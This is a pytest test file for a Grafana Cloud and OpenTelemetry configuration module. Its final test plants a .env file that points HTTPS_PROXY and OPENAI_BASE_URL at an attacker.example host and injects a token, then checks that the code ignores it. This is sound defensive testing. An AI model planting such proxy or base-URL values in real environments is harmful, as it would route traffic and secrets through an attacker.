import os
from contextlib import contextmanager

import pytest

from config.grafana_cloud import (
    apply_otel_env_defaults,
    configure_grafana_cloud,
    get_datasource_uids,
    get_effective_otlp_endpoint,
    get_grafana_read_token,
    load_env,
    validate_grafana_cloud_config,
)


@contextmanager
def temp_env(values: dict[str, str]):
    original = os.environ.copy()
    keys_to_clear = [
        "GCLOUD_HOSTED_METRICS_ID",
        "GCLOUD_HOSTED_METRICS_URL",
        "GCLOUD_HOSTED_LOGS_ID",
        "GCLOUD_HOSTED_LOGS_URL",
        "GCLOUD_RW_API_KEY",
        "GCLOUD_OTLP_ENDPOINT",
        "GCLOUD_OTLP_AUTH_HEADER",
        "OTEL_EXPORTER_OTLP_ENDPOINT",
        "OTEL_EXPORTER_OTLP_HEADERS",
        "OTEL_EXPORTER_OTLP_PROTOCOL",
    ]
    for key in keys_to_clear:
        os.environ.pop(key, None)
    os.environ.update({"GRAFANA_CONFIG_SKIP_ENV_FILE": "1", **values})
    try:
        yield
    finally:
        os.environ.clear()
        os.environ.update(original)


def test_configure_grafana_cloud_sets_otel_vars():
    with temp_env(
        {
            "GCLOUD_OTLP_ENDPOINT": "https://example.grafana.net/otlp",
            "GCLOUD_OTLP_AUTH_HEADER": "Basic abc123",
        }
    ):
        configure_grafana_cloud()
        assert os.getenv("OTEL_EXPORTER_OTLP_ENDPOINT") == "https://example.grafana.net/otlp"
        assert os.getenv("OTEL_EXPORTER_OTLP_PROTOCOL") == "http/protobuf"
        assert os.getenv("OTEL_EXPORTER_OTLP_HEADERS") == "Authorization=Basic abc123"


def test_apply_otel_env_defaults_sets_when_missing():
    with temp_env(
        {
            "GCLOUD_OTLP_ENDPOINT": "https://example.grafana.net/otlp",
            "GCLOUD_OTLP_AUTH_HEADER": "Basic abc123",
        }
    ):
        os.environ.pop("OTEL_EXPORTER_OTLP_ENDPOINT", None)
        os.environ.pop("OTEL_EXPORTER_OTLP_HEADERS", None)
        os.environ.pop("OTEL_EXPORTER_OTLP_PROTOCOL", None)
        apply_otel_env_defaults()
        assert os.getenv("OTEL_EXPORTER_OTLP_ENDPOINT") == "https://example.grafana.net/otlp"
        assert os.getenv("OTEL_EXPORTER_OTLP_PROTOCOL") == "http/protobuf"
        assert os.getenv("OTEL_EXPORTER_OTLP_HEADERS") == "Authorization=Basic abc123"


def test_validate_grafana_cloud_config_flags_missing():
    with (
        temp_env(
            {
                "GCLOUD_OTLP_ENDPOINT": "https://example.grafana.net/otlp",
                "OTEL_EXPORTER_OTLP_ENDPOINT": "https://example.grafana.net/otlp",
            }
        ),
        pytest.raises(ValueError, match="missing env vars"),
    ):
        validate_grafana_cloud_config()


def test_validate_grafana_cloud_config_passes_when_present():
    with temp_env(
        {
            "OTEL_EXPORTER_OTLP_ENDPOINT": "https://example.grafana.net/otlp",
            "GCLOUD_HOSTED_METRICS_ID": "1",
            "GCLOUD_HOSTED_METRICS_URL": "https://metrics",
            "GCLOUD_HOSTED_LOGS_ID": "2",
            "GCLOUD_HOSTED_LOGS_URL": "https://logs",
            "GCLOUD_RW_API_KEY": "token",
            "GCLOUD_OTLP_ENDPOINT": "https://example.grafana.net/otlp",
            "GCLOUD_OTLP_AUTH_HEADER": "Basic abc123",
        }
    ):
        assert validate_grafana_cloud_config() is True


def test_load_env_reads_export_prefixed_assignments(tmp_path):
    """``export KEY=value`` sets ``KEY``, the same as the OpenSRE env bootstrap."""
    env_file = tmp_path / ".env"
    env_file.write_text(
        "export GCLOUD_OTLP_ENDPOINT=https://example.grafana.net/otlp\n", encoding="utf-8"
    )
    with temp_env({}):
        os.environ.pop("GRAFANA_CONFIG_SKIP_ENV_FILE")
        load_env(env_file)
        assert os.getenv("GCLOUD_OTLP_ENDPOINT") == "https://example.grafana.net/otlp"
        assert "export GCLOUD_OTLP_ENDPOINT" not in os.environ


def test_reading_grafana_settings_never_loads_the_working_directory_env_file(tmp_path, monkeypatch):
    """A ``.env`` in a repository someone else wrote must not become process environment."""
    (tmp_path / ".env").write_text(
        "HTTPS_PROXY=http://attacker.example:8080\n"
        "OPENAI_BASE_URL=https://attacker.example/v1\n"
        "GRAFANA_READ_TOKEN=planted\n",
        encoding="utf-8",
    )
    monkeypatch.chdir(tmp_path)
    with temp_env({}):
        os.environ.pop("GRAFANA_CONFIG_SKIP_ENV_FILE")
        for name in ("HTTPS_PROXY", "OPENAI_BASE_URL", "GRAFANA_READ_TOKEN"):
            os.environ.pop(name, None)

        get_datasource_uids()
        get_effective_otlp_endpoint()
        apply_otel_env_defaults()

        assert get_grafana_read_token() == ""
        assert "HTTPS_PROXY" not in os.environ
        assert "OPENAI_BASE_URL" not in os.environ
